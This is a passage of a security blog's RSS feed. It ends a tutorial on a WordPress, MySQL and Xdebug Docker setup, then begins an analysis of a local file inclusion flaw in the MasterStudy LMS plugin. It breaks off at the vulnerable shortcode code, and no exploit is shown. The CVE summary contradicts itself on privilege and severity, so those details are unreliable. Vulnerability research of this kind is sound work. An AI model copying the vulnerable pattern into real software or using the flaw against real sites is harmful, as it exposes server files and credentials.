need:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;A &lt;strong&gt;MySQL&lt;/strong&gt; container for the database.&lt;/li&gt;&#xA;&lt;li&gt;A &lt;strong&gt;WordPress (PHP + web server)&lt;/strong&gt; container for the site itself.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Manually setting this up involves complex commands and configurations.&lt;br&gt;&#xA;With Docker Compose, everything is neatly handled in one YAML file:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Easy setup&lt;/strong&gt;: Run &lt;code&gt;docker-compose up -d&lt;/code&gt; to get WordPress + MySQL instantly.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Easy sharing&lt;/strong&gt;: Anyone can use your &lt;code&gt;docker-compose.yml&lt;/code&gt; to replicate your setup.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Easy expansion&lt;/strong&gt;: Add phpMyAdmin, Nginx, or Xdebug with just a few extra lines.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Install instructions: &lt;a href=&#34;https://docs.docker.com/compose/install/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.docker.com/compose/install/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;installing-wordpress-with-docker-compose-and-xdebug&#34;&gt;&lt;span&gt;Installing WordPress with Docker Compose and Xdebug&lt;/span&gt;&#xA;  &lt;a href=&#34;#installing-wordpress-with-docker-compose-and-xdebug&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;This section shows how to install &lt;strong&gt;WordPress using Docker Compose&lt;/strong&gt;, with &lt;strong&gt;Xdebug integration&lt;/strong&gt; for debugging directly in &lt;strong&gt;VS Code&lt;/strong&gt;.&lt;br&gt;&#xA;This gives you a complete development setup that’s easy to debug and extend.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Folder structure:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;.&#xA;├── wordpress&#xA;├── docker-compose.yml&#xA;├── Dockerfile&#xA;├── php.ini&#xA;└── .vscode&#xA;    └── launch.json&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;setup-environment&#34;&gt;&lt;span&gt;Setup Environment&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup-environment&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a new folder to store all configuration files:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mkdir wordpress-docker &amp;amp;&amp;amp; cd wordpress-docker&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;create-dockerfile&#34;&gt;&lt;span&gt;Create Dockerfile&lt;/span&gt;&#xA;  &lt;a href=&#34;#create-dockerfile&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The default WordPress image &lt;strong&gt;does not include Xdebug&lt;/strong&gt;, so we’ll extend it with a &lt;code&gt;Dockerfile&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano Dockerfile&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Content:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;FROM wordpress:latest&#xA;&#xA;# Install Xdebug&#xA;RUN pecl install xdebug &amp;amp;&amp;amp; docker-php-ext-enable xdebug&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;create-docker-composeyml&#34;&gt;&lt;span&gt;Create docker-compose.yml&lt;/span&gt;&#xA;  &lt;a href=&#34;#create-docker-composeyml&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Now create the file that configures the full environment:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano docker-compose.yml&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Content:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;services:&#xA;  db:&#xA;    image: mysql:latest&#xA;    container_name: wp_db&#xA;    restart: always&#xA;    environment:&#xA;      MYSQL_ROOT_PASSWORD: root&#xA;      MYSQL_DATABASE: wordpress&#xA;      MYSQL_USER: wordpress&#xA;      MYSQL_PASSWORD: wordpress&#xA;    volumes:&#xA;      - db_data:/var/lib/mysql&#xA;&#xA;  wordpress:&#xA;    build: .&#xA;    container_name: wp_app&#xA;    depends_on:&#xA;      - db&#xA;    ports:&#xA;      - &amp;#34;80:80&amp;#34;&#xA;    restart: always&#xA;    environment:&#xA;      WORDPRESS_DB_HOST: db:3306&#xA;      WORDPRESS_DB_USER: wordpress&#xA;      WORDPRESS_DB_PASSWORD: wordpress&#xA;      WORDPRESS_DB_NAME: wordpress&#xA;    volumes:&#xA;      - ./wordpress:/var/www/html&#xA;      - ./php.ini:/usr/local/etc/php/conf.d/php.ini&#xA;&#xA;volumes:&#xA;  db_data:&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The &lt;code&gt;volumes:&lt;/code&gt; section handles &lt;strong&gt;data persistence and source code synchronization&lt;/strong&gt; between your host machine and containers.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Explanation:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;db_data:/var/lib/mysql&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&#xA;Stores MySQL data persistently — your database won’t be lost if the container is removed.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;./wordpress:/var/www/html&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&#xA;Syncs WordPress source code between your machine and the container, allowing live editing.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;./php.ini:/usr/local/etc/php/conf.d/php.ini&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&#xA;Mounts your PHP/Xdebug config file for easy customization without rebuilding the image.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;create-phpini&#34;&gt;&lt;span&gt;Create php.ini&lt;/span&gt;&#xA;  &lt;a href=&#34;#create-phpini&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Enable Xdebug and adjust PHP settings.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano php.ini&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Content:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;zend_extension=xdebug&#xA;xdebug.mode=debug&#xA;xdebug.start_with_request=yes&#xA;xdebug.client_host=172.17.0.1&#xA;xdebug.client_port=9003&#xA;xdebug.log_level=0&#xA;&#xA;upload_max_filesize = 64M&#xA;post_max_size = 64M&#xA;memory_limit = 128M&#xA;max_execution_time = 300&#xA;max_input_time = 300&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Explanation:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The &lt;code&gt;xdebug.*&lt;/code&gt; lines enable debugging in VS Code.&lt;/li&gt;&#xA;&lt;li&gt;The remaining lines increase upload and memory limits for PHP.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;create-vs-code-launch-configuration&#34;&gt;&lt;span&gt;Create VS Code Launch Configuration&lt;/span&gt;&#xA;  &lt;a href=&#34;#create-vs-code-launch-configuration&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create the VS Code config file to connect with Xdebug:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mkdir .vscode &amp;amp;&amp;amp; nano .vscode/launch.json&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Content:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;version&amp;#34;: &amp;#34;0.2.0&amp;#34;,&#xA;  &amp;#34;configurations&amp;#34;: [&#xA;    {&#xA;      &amp;#34;name&amp;#34;: &amp;#34;Listen for Xdebug&amp;#34;,&#xA;      &amp;#34;type&amp;#34;: &amp;#34;php&amp;#34;,&#xA;      &amp;#34;request&amp;#34;: &amp;#34;launch&amp;#34;,&#xA;      &amp;#34;port&amp;#34;: 9003,&#xA;      &amp;#34;pathMappings&amp;#34;: {&#xA;        &amp;#34;/var/www/html&amp;#34;: &amp;#34;${workspaceFolder}/wordpress&amp;#34;&#xA;      },&#xA;      &amp;#34;log&amp;#34;: true&#xA;    }&#xA;  ]&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;install-vs-code-extension&#34;&gt;&lt;span&gt;Install VS Code Extension&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-vs-code-extension&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Open VS Code → &lt;strong&gt;Extensions (Ctrl + Shift + X)&lt;/strong&gt; → Search and install:&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;&lt;strong&gt;PHP Debug (by Xdebug)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;run-docker-compose&#34;&gt;&lt;span&gt;Run Docker Compose&lt;/span&gt;&#xA;  &lt;a href=&#34;#run-docker-compose&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Start the environment:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;docker-compose up -d&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After the containers start, visit &lt;strong&gt;&lt;a href=&#34;http://localhost&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost&lt;/a&gt;&lt;/strong&gt; to complete the WordPress installation.&lt;br&gt;&#xA;You can now set breakpoints in your PHP code and debug directly in VS Code.&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32141 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-21-cve-2025-32141/</link>
      <pubDate>Tue, 21 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-21-cve-2025-32141/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-21-cve-2025-32141/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;MasterStudy LMS&lt;/strong&gt; plugin version &lt;strong&gt;≤ 3.5.28&lt;/strong&gt; contains a &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt; vulnerability that allows an unauthenticated attacker to control the file parameter in the &lt;code&gt;include/require&lt;/code&gt; statement, enabling the inclusion or reading of local files on the server (e.g., configuration files containing credentials). This can lead to sensitive information disclosure and, in certain configurations, remote code execution.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32141&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32141&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.28&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.29&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/masterstudy-lms-learning-management-system/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MasterStudy LMS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;MasterStudy LMS&lt;/strong&gt;: &lt;strong&gt;3.5.28&lt;/strong&gt; (vulnerable) and &lt;strong&gt;3.5.29&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to compare the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable Version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;add_shortcode( &amp;#39;stm_lms_courses_categories&amp;#39;, &amp;#39;stm_lms_courses_categories_shortcode&amp;#39; );&#xA;function stm_lms_courses_categories_shortcode( $atts ) {&#xA;    $atts = shortcode_atts(&#xA;        array(&#xA;            &amp;#39;taxonomy&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;style&amp;#39;    =&amp;gt; &amp;#39;style_1&amp;#39;,&#xA;        ),&#xA;        $atts&#xA;    